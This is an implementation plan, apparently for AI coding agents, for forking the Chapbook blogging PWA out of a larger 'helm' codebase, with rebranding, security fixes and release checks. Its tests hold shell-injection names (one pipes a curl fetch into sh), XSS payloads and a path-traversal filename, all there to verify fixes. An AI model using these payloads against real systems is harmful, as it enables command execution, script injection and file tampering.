# Chapbook–Helm Separation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fork the Chapbook product out of `helm/` into this standalone repo, excise all Helm/owner-only code, fix the release blockers, and keep exactly three async Helm touchpoints (licence mint queue, revoke-list fetch, Netlify Blobs metrics).

**Architecture:** Vanilla-JS PWA (19k-line `index.html` shell + esbuild-bundled `app.js` engine) served flat at `/` from Netlify site `d825cd70-8cca-4b78-a92b-2245e6876d48` (chapbook.rqai.co.uk), with four Netlify functions. Hard fork: source is rebranded/cleaned directly; `build.mjs` collapses to bundle+copy. The owner's `helm/` tree is never modified.

**Tech Stack:** Node 22+, esbuild, `node --test`, DOMPurify (vendored via npm), `@netlify/blobs`, Netlify CLI (already authed on this Mac).

## Global Constraints

- **Fork base (record verbatim in README):** `helm` snapshot at `/Users/inayatsmac/Desktop/Transferred to new mac/Inayat-website/helm`, branch `feat/literature-decoded`, commit `259544d` (2026-07-08) **plus uncommitted working-tree edits through 2026-07-12**. Canonical Air 2 offline at fork time; go-live commit `64fb912` reconstructed as: Buy link → `https://buy.stripe.com/5kQeVd0C06t7aSLf3IgUM05?client_reference_id=studio`. Reconcile against Air 2 when it returns.
- **NEVER modify anything under** `/Users/inayatsmac/Desktop/Transferred to new mac/Inayat-website/helm` — read/copy only.
- Product name in ALL user-facing copy: **Chapbook**. Public contact email: **support@rqai.co.uk**. Sales-pipeline product id stays **`studio`** (payment link `client_reference_id=studio`, queue records, trial allowlist).
- British spelling in all copy ("licence", "colour").
- No CDN/external scripts (CSP is `self`): all JS deps vendored/bundled.
- Line numbers in this plan are from the audited snapshot — **locate by the quoted string, not the number**.
- Every task: run `npm test` and `npm run build` green before its commit.
- Netlify deploys before Task 16 MUST be drafts (`netlify deploy` without `--prod`).

---

### Task 1: Scaffold + copy the deployable set (P0a)

**Files:**
- Create: `package.json`, `.gitignore`, `src/**` (copied), `netlify/functions/*.mjs` (copied), `netlify.toml` (copied+edited), `build.mjs` (copied, path-edit only)

**Interfaces:**
- Produces: repo layout all later tasks assume — `src/` = app source; `src/lib/` = modules lifted from `helm/server`; `dist/` = build output (gitignored); `netlify/functions/` at repo root.

- [ ] **Step 1: Copy files** (`SNAP="/Users/inayatsmac/Desktop/Transferred to new mac/Inayat-website/helm"`):

```bash
cd /Users/inayatsmac/Projects/chapbook
mkdir -p src/lib netlify/functions scripts
# shell + static assets (from the owner's public/studio)
cp "$SNAP/public/studio/index.html" "$SNAP/public/studio/sw.js" "$SNAP/public/studio/manifest.json" \
   "$SNAP/public/studio/preview.css" "$SNAP/public/studio/resize.js" \
   "$SNAP/public/studio/icon.svg" "$SNAP/public/studio/icon-192.png" "$SNAP/public/studio/icon-512.png" \
   "$SNAP/public/studio/apple-touch-icon.png" "$SNAP/public/studio/icons-manifest.json" "$SNAP/public/studio/icons-sprite.svg" src/
mkdir -p src/vendor && cp "$SNAP/public/studio/vendor/exifr.esm.js" src/vendor/
# engine source (from studio-app)
cp "$SNAP/studio-app/app.js" "$SNAP/studio-app/router.js" "$SNAP/studio-app/darkroom-upload.src.js" src/
cp -R "$SNAP/studio-app/core" "$SNAP/studio-app/seams" src/
# server modules the client bundle imports (lifted; client-only subset)
cp "$SNAP/server/blocks.js" "$SNAP/server/frontmatter.js" src/lib/
cp -R "$SNAP/server/templates" src/lib/templates
cp -R "$SNAP/server/ai" src/lib/ai
# functions + netlify config + build
cp "$SNAP/studio-app/netlify/functions/gh-device.mjs" "$SNAP/studio-app/netlify/functions/stripe-webhook.mjs" \
   "$SNAP/studio-app/netlify/functions/trial-request.mjs" netlify/functions/
cp "$SNAP/studio-app/netlify.toml" ./netlify.toml
cp "$SNAP/studio-app/build.mjs" "$SNAP/studio-app/checkInlineModule.mjs" "$SNAP/studio-app/checkInlineModule.test.mjs" ./
# any STRIPE-SEAM/docs worth keeping
cp "$SNAP/studio-app/netlify/functions/STRIPE-SEAM.md" docs/ 2>/dev/null || true
```

Then check what `src/app.js`, `src/router.js`, `src/core/*`, `src/seams/*` import from `../server/` or `../../server/` (`grep -rn "server/" src --include='*.js' | grep -v lib/`) and copy any *additional* server modules the bundle needs into `src/lib/` (e.g. `licence.js` if imported). **Do not** copy server-only modules (fastify routes, sqlite, pidGuard).

- [ ] **Step 2: Write `package.json` and `.gitignore`:**

```json
{
  "name": "chapbook",
  "private": true,
  "type": "module",
  "engines": { "node": ">=22.5" },
  "scripts": {
    "build": "node build.mjs",
    "test": "node --test",
    "gate": "node scripts/release-gate.mjs",
    "deploy:draft": "npm run build && netlify deploy --dir dist --functions netlify/functions --site d825cd70-8cca-4b78-a92b-2245e6876d48",
    "deploy:prod": "npm run build && netlify deploy --prod --dir dist --functions netlify/functions --site d825cd70-8cca-4b78-a92b-2245e6876d48"
  },
  "dependencies": { "@netlify/blobs": "^8", "dompurify": "^3" },
  "devDependencies": { "esbuild": "^0.23" }
}
```

`.gitignore`: `node_modules/`, `dist/`, `.netlify/`, `.DS_Store`. Run `npm install`.

- [ ] **Step 3: Path-edit only (parity build).** In `build.mjs` change `const SRC = 'public/studio'` → `'src'`, `const DIST = 'studio-app/dist'` → `'dist'`, entry points `studio-app/app.js` → `src/app.js`, `studio-app/darkroom-upload.src.js` → `src/darkroom-upload.src.js`, and the licence-key import `../server/licence.js` → whatever landed in `src/lib/` (copy `server/licence.js`'s exported `PUBLIC_KEY` into `src/lib/licence-pubkey.js` as `export const PUBLIC_KEY = '<same value>'` if the full module drags in server deps). Rewrite `src/**` relative imports that pointed at `../server/*` → `./lib/*` (from `src/app.js` etc.). Keep ALL brand/boot/path transforms unchanged — Task 1 output must match today's product.

- [ ] **Step 4: Build + verify parity:** `npm run build` → expect the same console lines as the helm build (licence key baked ✓, AI map ✓, inline module ✓, brand rename, device-flow id `(none — PAT-only)` is OK pre-env). Then `diff <(ls "$SNAP/studio-app/dist") <(ls dist)` → identical file list; `grep -c 'Connect to my' dist/index.html` matches the snapshot's dist. Fix import breakage until green.

- [ ] **Step 5: Commit:** `git add -A && git commit -m "feat: fork Chapbook deployable set from helm snapshot (parity build)"` (include the fork-base note in the commit body).

### Task 2: Apply the go-live delta + draft-deploy parity check (P0b)

**Files:**
- Modify: `src/index.html` (Stripe link), `README.md` (create: fork base + deploy commands)

- [ ] **Step 1:** In `src/index.html` find `https://buy.stripe.com/test_9B6cN58cL0a55Cq0Tj6oo01?client_reference_id=studio` and replace with `https://buy.stripe.com/5kQeVd0C06t7aSLf3IgUM05?client_reference_id=studio`; delete the `TEST-mode Stripe payment link (sandbox)` comment above it. Verify: `grep -c 'buy.stripe.com/test_' src/index.html` → 0.
- [ ] **Step 2:** Write `README.md`: what Chapbook is, fork-base paragraph (Global Constraints verbatim), build/deploy commands, and a placeholder "## Helm boundary" section (filled in Task 9).
- [ ] **Step 3:** `STUDIO_GH_CLIENT_ID=Ov23liB0NzXKQmhnlPng npm run deploy:draft` → note the draft URL. Smoke: `curl -s <draft>/index.html | grep -c 'Activate Chapbook'` ≥ 1; `curl -s -o /dev/null -w '%{http_code}' <draft>/studio.js` → 200; POST `{"step":"code","params":{"client_id":"x"}}` to `<draft>/.netlify/functions/gh-device` → JSON (not 502).
- [ ] **Step 4:** Commit: `feat: live Stripe link (reconstructed 64fb912) + README; draft parity verified`.

### Task 3: Excise remote-Helm mode + admin-login shell (P1a)

**Files:**
- Modify: `src/app.js`, `src/index.html`, `build.mjs`; Delete: `src/seams/remote.js` (and its wiring in `src/seams/config.js` / `src/app.js`)

**Interfaces:**
- Produces: single-mode onboarding (BYOK GitHub only). `window.__studioRemote` no longer exists anywhere; `api()` in index.html keeps ONLY the `window.__studioApi` client-router branch and the local-server fallback is removed with the login shell.

- [ ] **Step 1 (app.js onboarding):** Locate `<h2>Set up your <b>Studio</b></h2>` (~:210). Remove the mode chooser: the `data-mode="remote"` card (`Connect to my&nbsp;Helm…use the laptop's state`), the remote pane (`Run <b>npm&nbsp;run&nbsp;tunnel</b>…`, the Helm-tunnel URL input, the `helm-token` admin-token input, `Connected to your Helm ✓`, `Could not reach that URL — is Helm running and the tunnel up?`, `Remote Helm not configured`). Keep the GitHub/BYOK path as the only flow (no chooser screen). Heading text becomes `Set up <b>Chapbook</b>`.
- [ ] **Step 2 (seams):** Delete `src/seams/remote.js`; remove its import/registration (grep `__studioRemote` and `remote` across `src/app.js`, `src/seams/`, `src/core/` — delete each consumer branch, keeping the non-remote branch).
- [ ] **Step 3 (index.html):** In `api()` remove the `window.__studioRemote.active` branch (keep `if(window.__studioApi){…}`). Remove the admin-login shell: the block containing `Enter your Helm admin password` (~:2691) and the `fetch('/admin/api/login')` handler (~:4831); the boot gate in source becomes (this bakes in what build.mjs used to inject — `TOKEN`/login is gone):
```js
if(window.__studioConfig && window.__studioConfig.isReady()){ boot(); } else { window.__studioOnboard(); }
```
- [ ] **Step 4 (build.mjs):** Delete the now-broken guards and transforms: the `bootOld/bootNew` replace, the `window.__studioRemote.active` assert (keep the `__studioApi` assert).
- [ ] **Step 5:** `npm run build` green; `grep -c '__studioRemote\|npm run tunnel\|admin password\|X-Admin-Token\|helm-token' dist/index.html dist/studio.js` → all 0. Commit: `feat: remove remote-Helm mode and admin-login shell from public product`.

### Task 4: Rebrand at source + remove owner personalisation (P1b)

**Files:**
- Modify: `src/index.html`, `src/app.js`, `src/core/shareIntents.js`, `src/core/r2.js`, `src/manifest.json`, `build.mjs`

**Interfaces:**
- Produces: `shareIntents.normaliseOrigin()` returns `''` when unconfigured (was `https://inayatpanda.com`); callers must treat empty origin as "sharing disabled until site URL set".

- [ ] **Step 1 (brand at source):** Apply build.mjs's brand table directly to `src/index.html` (`<title>The Helm</title>`→`<title>Chapbook</title>`, both `<h1>` brands, apple-mobile-web-app-title, `Activate Studio`→`Activate Chapbook`, access-key copy) and all its soft touch-ups (`hosted Studio`, `Open Studio on`, `'Studio '+b`, `Studio · local build`, `the Studio picks that provider`). Sweep the REST of the user-facing "Studio"/"The Helm"/"Helm" copy in `src/index.html` and `src/app.js` → "Chapbook" (internal identifiers `__STUDIO_*`, localStorage keys `helm.studio.*`, and the `studio` product id are KEPT — renaming them breaks activation/config of existing users and the sales pipeline). `src/manifest.json`: `"The Helm"` → `"Chapbook"`.
- [ ] **Step 2 (owner defaults):** 
  - `src/core/shareIntents.js:16` `DEFAULT_ORIGIN = 'https://inayatpanda.com'` → `''`; `normaliseOrigin('')` returns `''`; guard `postLiveUrl()`/`absoluteImageUrl()` to return `null` on empty origin.
  - `src/index.html` inline mirror (~:5145) same change; where `_siteOrigin()` is consumed, empty → hide/disable share-link UI with copy `Set your site URL in Settings to enable sharing.`
  - Share-card canvas footer (~:5473) `'Inayat Panda · inayatpanda.com'` → draw the user's configured site host, or skip the footer line when unset.
  - Crossref mailto (~:8028) `studio@inayatpanda.com` → `support@rqai.co.uk`.
  - Committed-image thumbnails (~:13794) `pic.src = 'https://inayatpanda.com' + im.url` → resolve from the user's configured site origin; fall back to a neutral placeholder tile when unset.
  - Placeholder `inayatpanda.com/blog/…` (~:2791) → `yourblog.example/blog/…`; `github.com/inayatpanda/inayatpanda-site` link (~:3421) → remove.
  - Publish confirm `Publish this post to inayatpanda.com now?` → `Publish this post to <user site host> now?` (or "your blog" when unset).
  - `src/core/r2.js:78` `buildCorsPolicy(origin = 'https://inayat-studio.netlify.app')` → default `'https://chapbook.rqai.co.uk'` (call sites already pass `window.location.origin`); update `src/core/r2.test.mjs` expectation.
- [ ] **Step 3 (build.mjs slims):** Remove the whole brand-replace block and its fatal table. `npm run build` green.
- [ ] **Step 4 (tests):** `node --test` green (fix `r2.test.mjs`); add `scripts/grep-gate.mjs` that fails if `dist/` matches any of: `inayatpanda.com|inayatpanda-site|studio@|admin token|X-Admin-Token|npm run tunnel|Connect to my Helm|Set up your Studio|hosted Studio|/admin/api/login|buy.stripe.com/test_`. Run it → green.
- [ ] **Step 5:** Commit: `feat: Chapbook branding at source; owner personalisation removed; grep gate`.

### Task 5: Flatten paths at source; slim build.mjs to final form (P1c)

**Files:**
- Modify: `src/index.html`, `src/sw.js`, `src/manifest.json`, `build.mjs`

- [ ] **Step 1:** Rewrite `/studio/` → `/` in `src/index.html`, `src/manifest.json` (incl. bare `"/studio"` start_url/scope → `"/"`). `src/sw.js`: `SHELL = ['/', '/index.html', '/manifest.json', '/icon.svg', '/icon-192.png', '/icon-512.png', '/apple-touch-icon.png', '/resize.js', '/preview.css']`, fallback `caches.match('/')`, bump `CACHE` name to `chapbook-v1`.
- [ ] **Step 2:** `build.mjs` final form — keep: licence-key drift guard (against `src/lib/licence-pubkey.js`), AI-defaults drift guard, inline-module parse check, both esbuild bundles, GH client-id/env injection (default `STUDIO_GH_CLIENT_ID` → `Ov23liB0NzXKQmhnlPng`), `<script type="module" src="./studio.js">` injection, `__studioApi` assert, copy list, `_redirects` writer. Remove: all `/studio/` split-joins, manifest/sw transforms (straight copies now).
- [ ] **Step 3:** `npm run build`; verify `grep -c "'/studio'" dist/sw.js` → 0 and `node -e "const s=require('fs').readFileSync('dist/sw.js','utf8'); if(!s.includes(\"'/'\")) process.exit(1)"`. `npm test` + grep gate green. Commit: `feat: root-relative paths at source; build.mjs reduced to bundle+copy`.

### Task 6: Stripe webhook — mint-command injection fix (P2a)

**Files:**
- Modify: `netlify/functions/stripe-webhook.mjs`; Create: `netlify/functions/stripe-webhook.test.mjs`

**Interfaces:**
- Produces: `export function safeName(raw)` (exported for tests) — whitelist filter used by BOTH `mintCommand()` and `saleRecord()`.

- [ ] **Step 1 (failing test):**
```js
import { test } from 'node:test';
import assert from 'node:assert';
import { safeName, mintCommand } from './stripe-webhook.mjs';
test('safeName strips shell metacharacters', () => {
  assert.equal(safeName('Rob $(curl evil|sh)'), 'Rob curl evilsh');
  assert.equal(safeName('a`id`b'), 'aidb');
  assert.equal(safeName("O'Neil-Smith j.o@x.y"), "O'Neil-Smith j.o@x.y");
  assert.equal(safeName(''), 'New customer');
});
test('mintCommand contains no $ or backtick even for hostile names', () => {
  const cmd = mintCommand({ name: '$(touch /tmp/pwn)`id`"', email: 'a@b.c' });
  assert.ok(!/[$`]/.test(cmd), cmd);
});
```
Run `node --test netlify/functions/stripe-webhook.test.mjs` → FAIL (no export).
- [ ] **Step 2 (fix):** In `stripe-webhook.mjs` replace the `who` line inside `mintCommand()` (~:78-81, currently `.replace(/["\\]/g,'\\$&')`) with a call to:
```js
export function safeName(raw) {
  const s = String(raw || '').replace(/[^\w .@'-]/g, '').replace(/\s+/g, ' ').trim().slice(0, 80);
  return s || 'New customer';
}
```
and pass `safeName(name || email)` through `mintCommand()` AND into `saleRecord()`'s stored name (~:89-103) so the hostile string never reaches the queue either. Keep behaviour otherwise identical (same command shape, same email/notify text).
- [ ] **Step 3:** Tests pass; `npm run build` unaffected. Commit: `fix(security): whitelist buyer name before mint command and queue record`.
- [ ] **Step 4 (cross-boundary flag):** Append to README boundary section: *"Helm-side `scripts/fulfil-sales.mjs` consumes queue `name` fields — apply the same `safeName` whitelist there when Air 2 is back (tracked, out of this repo)."*

### Task 7: metrics.mjs — anonymous Netlify Blobs counters + client ping (P2b)

**Files:**
- Create: `netlify/functions/metrics.mjs`, `netlify/functions/metrics.test.mjs`; Modify: `src/index.html` (two ping call sites)

**Interfaces:**
- Produces: `POST /.netlify/functions/metrics` body `{"type":"activate"|"install"|"visit"}` → 204. Counters stored in Blobs store `metrics`, key `YYYY-MM-DD`, value `{"activate":n,"install":n,"visit":n}`. `GET ?day=YYYY-MM-DD` → that JSON (Helm pulls via Netlify API/HTTP). Exported pure helper `bump(current, type)` for tests.

- [ ] **Step 1 (failing test):** test `bump(undefined,'install')` → `{install:1}`; `bump({install:2},'install')` → `{install:3}`; `bump({},'weird')` → null (rejected type).
- [ ] **Step 2 (implement):**
```js
import { getStore } from '@netlify/blobs';
const TYPES = new Set(['activate', 'install', 'visit']);
export function bump(current, type) {
  if (!TYPES.has(type)) return null;
  const c = current && typeof current === 'object' ? { ...current } : {};
  c[type] = (c[type] || 0) + 1;
  return c;
}
export default async (req) => {
  const store = getStore('metrics');
  if (req.method === 'GET') {
    const day = new URL(req.url).searchParams.get('day');
    if (!/^\d{4}-\d{2}-\d{2}$/.test(day || '')) return new Response('{}', { status: 400 });
    return new Response(JSON.stringify((await store.get(day, { type: 'json' })) || {}), { headers: { 'content-type': 'application/json' } });
  }
  if (req.method !== 'POST') return new Response(null, { status: 405 });
  let type; try { type = (await req.json()).type; } catch { return new Response(null, { status: 400 }); }
  const day = new Date().toISOString().slice(0, 10);
  const next = bump(await store.get(day, { type: 'json' }), type);
  if (!next) return new Response(null, { status: 400 });
  await store.setJSON(day, next);   // no PII, no IP, no licence key — by design
  return new Response(null, { status: 204 });
};
```
- [ ] **Step 3 (client pings, fire-and-forget, once-flags in localStorage):** in `src/index.html` — after successful licence verification add `if(!localStorage.getItem('chapbook.pinged.activate')){navigator.sendBeacon('/.netlify/functions/metrics',JSON.stringify({type:'activate'}));localStorage.setItem('chapbook.pinged.activate','1');}`; add a `window.addEventListener('appinstalled', …)` equivalent for `install`. No ping on every visit in v1 (keep it minimal: activate + install only).
- [ ] **Step 4:** Tests pass; commit: `feat: anonymous daily metrics (Netlify Blobs) + activate/install pings`.

### Task 8: gh-device fix + throttle; trial-request commit + allowlist (P2c/P3a)

**Files:**
- Modify: `netlify/functions/gh-device.mjs`, `netlify/functions/trial-request.mjs`; Create: `netlify/functions/gh-device.test.mjs`, `netlify/functions/trial-request.test.mjs`

**Interfaces:**
- Produces: gh-device exports `rateLimitCheck(ip, now)` (pure, for tests); trial-request gains `const ALLOWED_PRODUCTS = new Set(['studio'])`.

- [ ] **Step 1 (failing tests):** (a) construct the OPTIONS response the way the handler does and assert it doesn't throw + status 204 — i.e. test a new exported `preflight()` returns `new Response(null,{status:204,headers:CORS})`; (b) `rateLimitCheck` allows ≤ 30 hits/10 min per IP, blocks the 31st; (c) trial-request rejects `product:'anything-else'` with 400, accepts `'studio'`.
- [ ] **Step 2 (gh-device):** line ~44 `new Response('', { status: 204, headers: CORS })` → `new Response(null, { status: 204, headers: CORS })` via exported `preflight()`. Add in-memory token bucket keyed by `context.ip ?? req.headers.get('x-nf-client-connection-ip')` (30 req / 10 min; 429 with `retry-after: 600` when exceeded — per-instance is acceptable v1). Tighten `Access-Control-Allow-Origin: '*'` (~:16) → reflect only `https://chapbook.rqai.co.uk` / `https://inayat-studio.netlify.app` / `http://localhost:*` (mirror `trial-request.mjs`'s existing `ALLOWED_ORIGINS` pattern at :31-39).
- [ ] **Step 3 (trial-request):** after the payload parse (~:73) add the allowlist: unknown product → `400 {"error":"unknown product"}`. This file is currently untracked in helm — committing it HERE is its first home; note that in the commit body.
- [ ] **Step 4:** Tests pass. Commit: `fix: gh-device 204 preflight + rate limit + origin allowlist; trial-request product allowlist`.

### Task 9: README boundary contract (P2 close-out)

**Files:**
- Modify: `README.md`

- [ ] **Step 1:** Fill "## Helm boundary" with the spec §3 table (mint queue → `inayatpanda/rqai-sales`; revoke list — quote the exact URL the licence gate fetches, grep `revoked.json` in `src/index.html` to confirm it (expected: `https://inayatpanda.com/licences/revoked.json` — if so, KEEP but note it is Helm-published static data, the one owner-domain reference allowed, and add it to the grep-gate allowlist as an exception); metrics Blobs store + GET shape for Helm's puller). Add "everything else is forbidden" line + the grep gate as enforcement. Commit: `docs: Helm boundary contract`.

### Task 10: Publish-path sanitiser (DOMPurify) (P3b)

**Files:**
- Modify: `src/lib/blocks.js`; Create: `src/lib/sanitise.js`, `src/lib/sanitise.test.mjs`

**Interfaces:**
- Produces: `sanitiseHtml(html) → string` (DOMPurify wrapper, browser-only module bundled by esbuild); `blocks.js` uses it in `stripUnsafeHtml` AND `rawDocFromMarkdown`.

- [ ] **Step 1 (failing tests, run under node with a minimal DOM — use `node:test` + jsdom-free approach: DOMPurify needs a window, so test via a tiny esbuild-bundled script executed in a headless Chrome via the existing checkInlineModule pattern is overkill — instead unit-test the POLICY: export the DOMPurify config object and assert it forbids `onerror`/`onload` attrs and `script/iframe/object/embed/svg` tags; plus an integration assertion added to the release gate).** Test cases: config `FORBID_TAGS` includes `svg`; `FORBID_ATTR` pattern kills `on*`; `ALLOWED_URI_REGEXP` rejects `javascript:`.
- [ ] **Step 2 (implement `src/lib/sanitise.js`):**
```js
import DOMPurify from 'dompurify';
export const PURIFY_CONFIG = {
  USE_PROFILES: { html: true },
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'svg', 'math', 'style', 'form'],
  FORBID_ATTR: ['formaction'],           // on* handlers are stripped by default profile
  ALLOW_UNKNOWN_PROTOCOLS: false,
};
export function sanitiseHtml(html) {
  return DOMPurify.sanitize(String(html ?? ''), PURIFY_CONFIG);
}
```
- [ ] **Step 3 (wire):** in `src/lib/blocks.js` — `stripUnsafeHtml()` (~:427) becomes `sanitiseHtml()` (keep the old regex as a follow-up defence line if desired, but DOMPurify is authoritative); `rawDocFromMarkdown()` (~:389-391) wraps its content: `content: sanitiseHtml(md)`. Confirm both import paths bundle (blocks.js is client-side in this fork).
- [ ] **Step 4 (verify the audit payloads die):** temporary node script bundling sanitise.js via esbuild + linkedom OR (simpler) add to the release gate a headless-browser check: paste `<img/src=x/onerror=alert(1)>` and `<svg/onload=alert(1)>` through the import path and assert the serialised markdown contains neither `onerror` nor `onload`. Implement whichever is achievable in <30 lines; the unit tests from Step 1 must pass regardless.
- [ ] **Step 5:** `npm test` + build green. Commit: `fix(security): parser-based sanitisation on import and raw/expand paths`.

### Task 11: Titleless-draft autosave (P3c)

**Files:**
- Modify: `src/index.html` (autosaveDraft, ~:10928-10933)

- [ ] **Step 1:** Change the early-return: when no title/slug, autosave under `slug = '__untitled__'` (constant `PROVISIONAL_SLUG`), status copy `Unsaved title · draft kept`. When a real title is first reserved, migrate the provisional record to the real slug and delete `__untitled__`. On boot, if `__untitled__` exists, offer it in the drafts list as "Untitled draft".
- [ ] **Step 2 (manual check, headless or by hand):** type body text with no title → reload → draft recoverable. Document the check result in the commit body. Commit: `fix: autosave titleless drafts under provisional slug`.

### Task 12: Templates + validateDoc hardening (P3d)

**Files:**
- Modify: `src/lib/templates/*.json` (the 7 failing), `src/lib/blocks.js`; Create: `src/lib/templates.test.mjs`

- [ ] **Step 1 (failing test):** load every JSON in `src/lib/templates` via its index and `validateDoc(t.doc)` each — currently 7/9 fail (`announcement, how-to, interactive, list-roundup, photo-story, review, travel-note`) on placeholder image blocks (`image` with no file/base64/url; validator at blocks.js:380).
- [ ] **Step 2:** Remove the empty `image` blocks from those templates (users add images themselves — spec decision). Test green.
- [ ] **Step 3 (traversal guard, failing test first):** `validateDoc` rejects image `file`/gallery `im.file` containing `/`, `\\`, or `..` (message `unsafe image filename`); test with `{"file":"../../.github/workflows/x.yml"}` → throws; `{"file":"t3.jpg"}` → passes.
- [ ] **Step 4:** Commit: `fix: templates pass their own validator; image filename traversal guard`.

### Task 13: Video posts on the user's R2 (P4)

**Files:**
- Modify: `src/index.html` (video composer UI + copy), `src/core/r2.js` (if upload helper needs a video/poster variant), `src/lib/blocks.js` (video block validate/serialise — check what exists first)

**Interfaces:**
- Produces: video block `{id, type:'video', url, poster, caption?, alt?}` — `url`/`poster` are the user's R2 public URLs; serialises to `<figure class="post-video"><video controls playsinline preload="metadata" poster="{poster}" src="{url}"></video>{caption→figcaption}</figure>`.

- [ ] **Step 1 (investigate, 15 min cap):** grep `video` across `src/index.html`, `src/lib/blocks.js`, `src/core/` — map the existing Helm-transcode flow (`videoHelmReachable()`, "Video upload + transcode run in your local Helm (npm start)") and whether a video block type already exists in serialiser/validator. Record findings in the task commit body.
- [ ] **Step 2 (failing tests):** blocks tests — `validateDoc` accepts the video block shape above only with https `url` + `poster` (reuse `isSafeImageRef`-style check); `serialiseBlock('video')` emits the `<figure>` markup above exactly.
- [ ] **Step 3 (implement serialiser/validator), Step 4 (composer UI):** gate the video option on R2 configured (else CTA → R2 setup panel with copy `Video needs your R2 media storage — set it up in Settings`); file picker accepts `video/mp4,video/quicktime`; before upload, probe playability: `const v=document.createElement('video'); v.src=URL.createObjectURL(file);` await `loadedmetadata` (warn on error: `This file may not play in all browsers — export as MP4 (H.264) for safety`); poster = canvas frame capture at t≈0.5s scaled to ≤1280px JPEG; upload video + poster via the existing R2 put path; insert block. Size guidance copy: `Large videos slow your blog — under ~100 MB recommended`. Remove ALL `videoHelmReachable()`/local-Helm video copy and code.
- [ ] **Step 5:** `npm test` + build + grep gate green (`npm run build && node scripts/grep-gate.mjs`; gate list gains `videoHelmReachable`). Commit: `feat: video posts via user R2 (poster capture, playability warning); Helm transcode path removed`.

### Task 14: Release gate script (P5a)

**Files:**
- Create: `scripts/release-gate.mjs`

**Interfaces:**
- Consumes: a deploy URL argument: `node scripts/release-gate.mjs https://<draft>.netlify.app`

- [ ] **Step 1:** Implement checks (each prints PASS/FAIL, exit 1 on any FAIL): (1) fetch every URL in dist/sw.js SHELL against the deploy → all 200; (2) headers on `/` and `/sw.js` include `content-security-policy`, `x-frame-options`, `x-content-type-options`, `referrer-policy`, `strict-transport-security`; (3) OPTIONS preflight to `/.netlify/functions/gh-device` → 204; (4) POST `{"type":"visit"}` → metrics 204 (then GET the day key → count present); (5) grep-gate over dist/ (reuse `grep-gate.mjs`); (6) `buy.stripe.com/test_` absent, live link present; (7) templates test green (`node --test src/lib/templates.test.mjs`).
- [ ] **Step 2:** `npm run deploy:draft` (with `STUDIO_GH_CLIENT_ID`) then `node scripts/release-gate.mjs <draft-url>` → ALL PASS (fix anything red). Commit: `feat: behavioural release gate`.

### Task 15: SW activation proof + full-flow manual test on the draft (P5a)

- [ ] **Step 1:** Headless check (Chrome DevTools MCP or Playwright): open the draft URL, wait, assert `navigator.serviceWorker.getRegistration()` resolves with `active` non-null and `caches.keys()` includes `chapbook-v1`. (This was impossible on the live product — the whole point.)
- [ ] **Step 2:** OWNER-DEPENDENT: full activate→create-blog→publish (incl. one image + one video) needs a real Chapbook licence key + a throwaway GitHub repo. **HOLD here and request both from the owner** — do not fabricate keys.

### Task 16: Cutover (P5b) — ⛔ OWNER GO REQUIRED

- [ ] **Step 1 (pre-flight):** release gate green on the latest draft; owner manual test (Task 15 Step 2) done; Netlify env still holds `STRIPE_WEBHOOK_SECRET`/`GITHUB_QUEUE_TOKEN` (unchanged — same site).
- [ ] **Step 2:** `STUDIO_GH_CLIENT_ID=Ov23liB0NzXKQmhnlPng npm run deploy:prod`; re-run `release-gate.mjs https://chapbook.rqai.co.uk`; verify SW activates on the live host (Task 15 Step 1 against prod).
- [ ] **Step 3 (rollback ready):** note the previous production deploy id (`netlify api listSiteDeploys …` or UI) in the commit body; rollback = "Publish deploy" on that id in the Netlify UI.
- [ ] **Step 4:** Update owner memory/notes: chapbook now builds from `~/Projects/chapbook` (helm/studio-app retired for the public product); Air 2 reconciliation + Helm-side `safeName` fix still pending; owner still owes the live `whsec_` paste into Netlify env.

---

## Self-review notes

- Spec coverage: §3 touchpoints → Tasks 6/7/9 (+revoke URL kept in Task 9); §4 shape → Task 1; §5 base/delta → Tasks 1–2; §6 table → Tasks 5(SW), 6(RCE), 8(gh-device, trial), 10(XSS), 11(autosave), 12(templates/traversal), headers verified in 14; §6a video → Task 13; §7 phases map 1:1; §8 gate → Tasks 14–15; §9 cutover → Task 16. CSP-tightening explicitly deferred (spec non-goal).
- Known judgement calls delegated with guardrails: exact `src/lib` subset (Task 1 Step 1 grep rule), share-UI empty-origin UX (Task 4), sanitiser test harness choice (Task 10 Step 4), video-block prior art (Task 13 Step 1).
- `revoked.json` on inayatpanda.com is an intentional grep-gate exception (documented in Task 9) until Helm publishes it on a neutral host.
